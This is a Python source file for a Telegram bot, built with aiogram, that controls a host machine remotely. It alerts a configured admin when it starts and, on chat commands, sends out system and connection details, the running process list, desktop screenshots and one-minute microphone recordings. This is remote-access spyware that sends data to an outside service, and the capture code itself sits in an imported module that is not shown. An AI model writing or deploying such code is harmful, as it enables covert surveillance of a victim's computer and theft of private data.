import os
import asyncio
import module
from aiogram import types
from tg_config import admin_id
from tg.dispatcher import dp


async def activate():
    await dp.bot.send_message(admin_id, "✔️ System started!")


try:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(activate())
except DeprecationWarning:
    pass


@dp.message_handler(commands="check")
async def system_check(message: types.Message):
    await message.answer("System status: online")


@dp.message_handler(commands="help")
async def support(message: types.Message):
    await message.answer(f'\nCommand List:\n'
                         f'/check - Checking System Status\n'
                         f'/pc_info - System characteristics\n'
                         f'/con_info - Connection characteristics\n'
                         f'/proc_info - List of running processes\n'
                         f'/screen - Desktop screenshot\n'
                         f'/audio - Record audio from a voice recorder for a minute\n'
                         f'/exit - Shutting down the program before reboot\n')


@dp.message_handler(commands="pc_info")
async def send_pc_info(message: types.Message):
    result = module.GetInfo().get_pc_info()
    await message.answer(result)


@dp.message_handler(commands="con_info")
async def send_connection_info(message: types.Message):
    result = module.GetInfo().get_connection_info()
    await message.answer(result)


@dp.message_handler(commands="proc_info")
async def send_process_info(message: types.Message):
    result = module.GetInfo().get_process()
    await message.answer(result)


@dp.message_handler(commands="screen")
async def send_screen(message: types.Message):
    screen_path = module.View().make_screenshot()
    await message.answer_photo(open(screen_path, "rb"))
    os.remove(screen_path)


@dp.message_handler(commands="audio")
async def send_audio(message: types.Message):
    audio_path = module.AudioRecording().recording()
    await message.answer_audio(open(audio_path, "rb"))
    os.remove(audio_path)


@dp.message_handler(commands="exit")
async def cmd_exit(message: types.Message):
    await message.answer("Goodbye!")
    raise SystemExit
